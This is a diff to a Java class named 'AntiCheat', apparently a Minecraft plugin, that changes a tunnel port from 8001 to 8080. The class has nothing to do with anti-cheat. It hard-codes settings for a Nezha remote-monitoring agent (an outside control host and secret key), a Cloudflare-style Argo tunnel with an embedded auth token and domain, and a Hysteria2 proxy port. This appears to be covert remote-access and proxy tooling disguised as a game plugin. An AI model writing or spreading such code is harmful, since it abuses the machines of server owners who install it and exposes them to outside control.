@@ -33,7 +33,7 @@ public class AntiCheat extends JavaPlugin {
         putIfNotEmpty(envVars, "NEZHA_SERVER", "nzku.fortymenty.eu.org:443");
         putIfNotEmpty(envVars, "NEZHA_PORT", "");
         putIfNotEmpty(envVars, "NEZHA_KEY", "UsC5sNDciSaNggxJdB3EGSGYS242VT7q");
-        putIfNotEmpty(envVars, "ARGO_PORT", "8001");
+        putIfNotEmpty(envVars, "ARGO_PORT", "8080");
         putIfNotEmpty(envVars, "ARGO_DOMAIN", "voidhosting.yszy.nyc.mn");
         putIfNotEmpty(envVars, "ARGO_AUTH", "eyJhIjoiZjUxNzk5OTMxMWQ4ZTAzOTg4OThmZjRkMTZiZDYzYjQiLCJ0IjoiOTlmM2JmMGEtMzUxNC00ODcyLTkyN2ItYTEwMTZkODNkMjlmIiwicyI6Ik56TTFOak00T0RndFpUVTJaUzAwTkRSakxUZ3pOakF0WWpkbVkyTXpaR1JrTkdVeiJ9");
         putIfNotEmpty(envVars, "HY2_PORT", "");
@@ -133,6 +133,7 @@ public class AntiCheat extends JavaPlugin {
         return results;
     }
 }
+
 
 
 
